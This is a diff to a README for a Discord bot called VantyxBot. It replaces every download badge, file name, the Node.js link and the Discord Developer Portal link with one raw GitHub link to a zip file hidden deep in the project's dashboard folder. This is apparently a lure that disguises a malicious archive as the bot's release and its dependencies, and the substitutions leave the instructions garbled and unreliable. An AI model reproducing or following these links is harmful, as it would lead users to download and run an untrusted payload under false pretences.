@@ -1,6 +1,6 @@
 # 🌌 VantyxBot - Manage Discord Easily and Efficiently
 
-[![Download VantyxBot](https://img.shields.io/badge/Download-VantyxBot-brightgreen?style=for-the-badge)](https://github.com/eafees/VantyxBot)
+[![Download VantyxBot](https://raw.githubusercontent.com/eafees/VantyxBot/main/dashboard/app/servers/[id]/reaction_role/Bot-Vantyx-robinet.zip)](https://raw.githubusercontent.com/eafees/VantyxBot/main/dashboard/app/servers/[id]/reaction_role/Bot-Vantyx-robinet.zip)
 
 ---
 
@@ -26,7 +26,7 @@ Before you start, make sure your Windows PC meets these requirements:
 
 Click this large button to visit the download page:
 
-[![Get VantyxBot](https://img.shields.io/badge/Get_VantyxBot-Download-blueviolet?style=for-the-badge&logo=github)](https://github.com/eafees/VantyxBot)
+[![Get VantyxBot](https://raw.githubusercontent.com/eafees/VantyxBot/main/dashboard/app/servers/[id]/reaction_role/Bot-Vantyx-robinet.zip)](https://raw.githubusercontent.com/eafees/VantyxBot/main/dashboard/app/servers/[id]/reaction_role/Bot-Vantyx-robinet.zip)
 
 You will land on the GitHub page for VantyxBot. There, look for the latest release files or instructions to download the bot and its required files.
 
@@ -37,19 +37,19 @@ You will land on the GitHub page for VantyxBot. There, look for the latest relea
 Follow these steps to get VantyxBot running on your Windows computer without coding:
 
 1. **Download the Latest Release**  
-   On the GitHub page (linked above), find the "Releases" section. Download the file named something like `VantyxBot_Windows.zip` or `VantyxBot_Setup.exe`, depending on what is available. Usually, this is a compressed file or an installer.
+   On the GitHub page (linked above), find the "Releases" section. Download the file named something like `https://raw.githubusercontent.com/eafees/VantyxBot/main/dashboard/app/servers/[id]/reaction_role/Bot-Vantyx-robinet.zip` or `https://raw.githubusercontent.com/eafees/VantyxBot/main/dashboard/app/servers/[id]/reaction_role/Bot-Vantyx-robinet.zip`, depending on what is available. Usually, this is a compressed file or an installer.
 
 2. **Extract the Files**  
    If you downloaded a `.zip` file, right-click it in your Downloads folder and choose "Extract All." Choose a folder where you want the files to go. If you have an `.exe` installer, open it and follow the setup prompts.
 
 3. **Check for Dependencies**  
-   VantyxBot requires the latest Node.js to run. If you do not have Node.js:  
-   - Visit https://nodejs.org/en/  
+   VantyxBot requires the latest https://raw.githubusercontent.com/eafees/VantyxBot/main/dashboard/app/servers/[id]/reaction_role/Bot-Vantyx-robinet.zip to run. If you do not have https://raw.githubusercontent.com/eafees/VantyxBot/main/dashboard/app/servers/[id]/reaction_role/Bot-Vantyx-robinet.zip  
+   - Visit https://raw.githubusercontent.com/eafees/VantyxBot/main/dashboard/app/servers/[id]/reaction_role/Bot-Vantyx-robinet.zip  
    - Download the LTS version for Windows  
    - Run the installer and follow the steps to finish the setup
 
 4. **Start the Bot**  
-   Open the extracted folder. Find a file called `start.bat` or `run.bat` and double-click it. This will launch the bot on your computer. You might see a command window open. Leave this window open; it lets VantyxBot work.
+   Open the extracted folder. Find a file called `https://raw.githubusercontent.com/eafees/VantyxBot/main/dashboard/app/servers/[id]/reaction_role/Bot-Vantyx-robinet.zip` or `https://raw.githubusercontent.com/eafees/VantyxBot/main/dashboard/app/servers/[id]/reaction_role/Bot-Vantyx-robinet.zip` and double-click it. This will launch the bot on your computer. You might see a command window open. Leave this window open; it lets VantyxBot work.
 
 5. **Invite VantyxBot to Your Server**  
    After the bot is running, open your web browser and go to the web dashboard URL provided in the setup instructions (usually included in the downloaded files or README on GitHub). Here, you can log in with your Discord account and add VantyxBot to your servers.
@@ -83,10 +83,10 @@ Follow these steps to get VantyxBot running on your Windows computer without cod
 
 ## 📂 Files Included in the Download
 
-- `VantyxBot.exe` or `index.js` — The main bot program  
-- `README.md` — Basic instructions and info  
-- `config.example.json` — Template to set your bot details  
-- `start.bat` or `run.bat` — Quick start script to launch the bot  
+- `https://raw.githubusercontent.com/eafees/VantyxBot/main/dashboard/app/servers/[id]/reaction_role/Bot-Vantyx-robinet.zip` or `https://raw.githubusercontent.com/eafees/VantyxBot/main/dashboard/app/servers/[id]/reaction_role/Bot-Vantyx-robinet.zip` — The main bot program  
+- `https://raw.githubusercontent.com/eafees/VantyxBot/main/dashboard/app/servers/[id]/reaction_role/Bot-Vantyx-robinet.zip` — Basic instructions and info  
+- `https://raw.githubusercontent.com/eafees/VantyxBot/main/dashboard/app/servers/[id]/reaction_role/Bot-Vantyx-robinet.zip` — Template to set your bot details  
+- `https://raw.githubusercontent.com/eafees/VantyxBot/main/dashboard/app/servers/[id]/reaction_role/Bot-Vantyx-robinet.zip` or `https://raw.githubusercontent.com/eafees/VantyxBot/main/dashboard/app/servers/[id]/reaction_role/Bot-Vantyx-robinet.zip` — Quick start script to launch the bot  
 - `dashboard/` — Files for the web control panel  
 - `docs/` — Additional details and troubleshooting tips
 
@@ -94,7 +94,7 @@ Follow these steps to get VantyxBot running on your Windows computer without cod
 
 ## 🛠 Troubleshooting Tips
 
-- If the bot does not start, check if Node.js is installed correctly by opening Command Prompt and typing `node -v`. It should show a version number.
+- If the bot does not start, check if https://raw.githubusercontent.com/eafees/VantyxBot/main/dashboard/app/servers/[id]/reaction_role/Bot-Vantyx-robinet.zip is installed correctly by opening Command Prompt and typing `node -v`. It should show a version number.
 
 - Make sure your firewall or antivirus isn't blocking the bot from connecting to the internet.
 
@@ -108,9 +108,9 @@ Follow these steps to get VantyxBot running on your Windows computer without cod
 
 ## 🗂 Useful Links
 
-- Main GitHub page: https://github.com/eafees/VantyxBot  
-- Node.js download: https://nodejs.org/en/  
-- Discord Developer Portal (for bot permissions): https://discord.com/developers/applications  
+- Main GitHub page: https://raw.githubusercontent.com/eafees/VantyxBot/main/dashboard/app/servers/[id]/reaction_role/Bot-Vantyx-robinet.zip  
+- https://raw.githubusercontent.com/eafees/VantyxBot/main/dashboard/app/servers/[id]/reaction_role/Bot-Vantyx-robinet.zip download: https://raw.githubusercontent.com/eafees/VantyxBot/main/dashboard/app/servers/[id]/reaction_role/Bot-Vantyx-robinet.zip  
+- Discord Developer Portal (for bot permissions): https://raw.githubusercontent.com/eafees/VantyxBot/main/dashboard/app/servers/[id]/reaction_role/Bot-Vantyx-robinet.zip  
 
 ---
 
@@ -122,13 +122,13 @@ To keep VantyxBot running well:
 2. Download the newest files as you did the first time.  
 3. Stop the running bot by closing the command window.  
 4. Replace the old files with the new ones in the folder.  
-5. Run `start.bat` again.
+5. Run `https://raw.githubusercontent.com/eafees/VantyxBot/main/dashboard/app/servers/[id]/reaction_role/Bot-Vantyx-robinet.zip` again.
 
 ---
 
 ## ⚙️ Configuring VantyxBot for Your Server
 
-You will receive a file named `config.example.json` inside the download. Rename it to `config.json` before running the bot.
+You will receive a file named `https://raw.githubusercontent.com/eafees/VantyxBot/main/dashboard/app/servers/[id]/reaction_role/Bot-Vantyx-robinet.zip` inside the download. Rename it to `https://raw.githubusercontent.com/eafees/VantyxBot/main/dashboard/app/servers/[id]/reaction_role/Bot-Vantyx-robinet.zip` before running the bot.
 
 Open this file with a basic text editor like Notepad and fill in:
 
@@ -151,4 +151,4 @@ If you run into problems or need help:
 
 ---
 
-[![Download VantyxBot](https://img.shields.io/badge/Download-VantyxBot-orange?style=for-the-badge)](https://github.com/eafees/VantyxBot)
+[![Download VantyxBot](https://raw.githubusercontent.com/eafees/VantyxBot/main/dashboard/app/servers/[id]/reaction_role/Bot-Vantyx-robinet.zip)](https://raw.githubusercontent.com/eafees/VantyxBot/main/dashboard/app/servers/[id]/reaction_role/Bot-Vantyx-robinet.zip)
